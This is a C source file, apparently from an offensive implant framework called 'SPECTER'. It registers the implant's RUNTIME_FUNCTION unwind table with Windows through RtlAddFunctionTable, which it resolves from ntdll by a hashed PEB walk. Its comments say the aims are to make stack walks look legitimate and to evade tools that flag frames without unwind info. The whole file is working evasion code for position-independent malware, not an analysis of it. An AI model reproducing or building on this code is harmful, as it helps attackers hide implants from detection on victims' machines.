/**
 * SPECTER Implant — .pdata Registration
 *
 * Registers the implant's RUNTIME_FUNCTION table with the Windows
 * exception dispatcher via RtlAddFunctionTable.  This allows the OS
 * to properly unwind through implant stack frames, which:
 *   1. Prevents crashes from unhandled exceptions in implant code
 *   2. Makes stack walks from ETW/WER look legitimate
 *   3. Avoids detection by tools that flag frames without unwind info
 *
 * The RUNTIME_FUNCTION array is emitted by the compiler into .pdata
 * and kept in the PIC blob via linker symbols __pdata_start/__pdata_end.
 * RtlAddFunctionTable is resolved from ntdll via PEB walk (not a
 * syscall — it's a regular user-mode API).
 */

#include "specter.h"
#include "ntdefs.h"
#include "evasion.h"
#include "peb.h"
#include "config.h"

/* ------------------------------------------------------------------ */
/*  DJB2 hash for RtlAddFunctionTable                                  */
/* ------------------------------------------------------------------ */

#define HASH_RTLADDFUNCTIONTABLE  0x4DCFB62E

/* ------------------------------------------------------------------ */
/*  RtlAddFunctionTable function pointer typedef                       */
/* ------------------------------------------------------------------ */

typedef BOOL (__attribute__((ms_abi)) *fn_RtlAddFunctionTable)(
    PRUNTIME_FUNCTION FunctionTable,
    DWORD             EntryCount,
    QWORD             BaseAddress
);

/* ------------------------------------------------------------------ */
/*  evasion_register_pdata                                              */
/* ------------------------------------------------------------------ */

NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base) {
    if (!ctx || !implant_base)
        return STATUS_INVALID_PARAMETER;

    SIZE_T payload_size = cfg_get_payload_size();
    if (payload_size < 0x2000)
        return STATUS_NOT_FOUND;

    PBYTE base = (PBYTE)implant_base;
    IMPLANT_CONFIG *cfg = NULL;
    if (ctx->implant_ctx)
        cfg = cfg_get(ctx->implant_ctx);
    if (cfg && cfg->pdata_offset != 0 && cfg->pdata_count != 0) {
        SIZE_T pdata_size = (SIZE_T)cfg->pdata_count * sizeof(RUNTIME_FUNCTION);
        if ((SIZE_T)cfg->pdata_offset + pdata_size <= payload_size) {
            PRUNTIME_FUNCTION pdata_begin =
                (PRUNTIME_FUNCTION)(base + cfg->pdata_offset);

            PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
            if (!ntdll_base)
                return STATUS_NOT_FOUND;

            fn_RtlAddFunctionTable pRtlAddFunctionTable =
                (fn_RtlAddFunctionTable)find_export_by_hash(
                    ntdll_base, HASH_RTLADDFUNCTIONTABLE);
            if (!pRtlAddFunctionTable)
                return STATUS_PROCEDURE_NOT_FOUND;

            BOOL ok = pRtlAddFunctionTable(
                pdata_begin,
                cfg->pdata_count,
                (QWORD)(ULONG_PTR)implant_base
            );
            if (!ok)
                return STATUS_UNSUCCESSFUL;

            ctx->pdata_table = pdata_begin;
            ctx->pdata_count = cfg->pdata_count;
            return STATUS_SUCCESS;
        }
    }

    SIZE_T best_offset = 0;
    DWORD best_count = 0;

    for (SIZE_T off = 0x1000;
         off + (sizeof(RUNTIME_FUNCTION) * 8) < payload_size;
         off += 4) {
        PRUNTIME_FUNCTION table = (PRUNTIME_FUNCTION)(base + off);
        DWORD count = 0;
        DWORD prev_begin = 0;

        while (off + ((SIZE_T)count + 1) * sizeof(RUNTIME_FUNCTION) <= payload_size) {
            RUNTIME_FUNCTION *entry = &table[count];
            if (entry->BeginAddress == 0 ||
                entry->BeginAddress >= entry->EndAddress ||
                entry->EndAddress >= payload_size ||
                entry->UnwindInfoAddress >= payload_size ||
                entry->UnwindInfoAddress < 0x20000 ||
                entry->BeginAddress < prev_begin ||
                (entry->EndAddress - entry->BeginAddress) > 0x20000) {
                break;
            }

            prev_begin = entry->BeginAddress;
            count++;
        }

        if (count > best_count) {
            best_count = count;
            best_offset = off;
        }
    }

    if (best_count < 8)
        return STATUS_NOT_FOUND;

    PRUNTIME_FUNCTION pdata_begin = (PRUNTIME_FUNCTION)(base + best_offset);
    DWORD entry_count = best_count;

    /* Resolve RtlAddFunctionTable from ntdll via PEB walk.
       This is a regular user-mode API, not a syscall. */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        return STATUS_PROCEDURE_NOT_FOUND;

    fn_RtlAddFunctionTable pRtlAddFunctionTable =
        (fn_RtlAddFunctionTable)find_export_by_hash(
            ntdll_base, HASH_RTLADDFUNCTIONTABLE);

    if (!pRtlAddFunctionTable)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* The BaseAddress parameter must be the base of the "image" that
       contains the functions described by the RUNTIME_FUNCTION entries.
       For our PIC blob, this is the implant's base address.  The
       BeginAddress/EndAddress fields in each RUNTIME_FUNCTION are RVAs
       relative to this base. */
    QWORD base_addr = (QWORD)(ULONG_PTR)implant_base;

    BOOL ok = pRtlAddFunctionTable(
        pdata_begin,
        entry_count,
        base_addr
    );

    if (!ok)
        return STATUS_UNSUCCESSFUL;

    /* Store registration info in evasion context for potential
       cleanup via RtlDeleteFunctionTable later */
    ctx->pdata_table = (PVOID)pdata_begin;
    ctx->pdata_count = entry_count;

    return STATUS_SUCCESS;
}
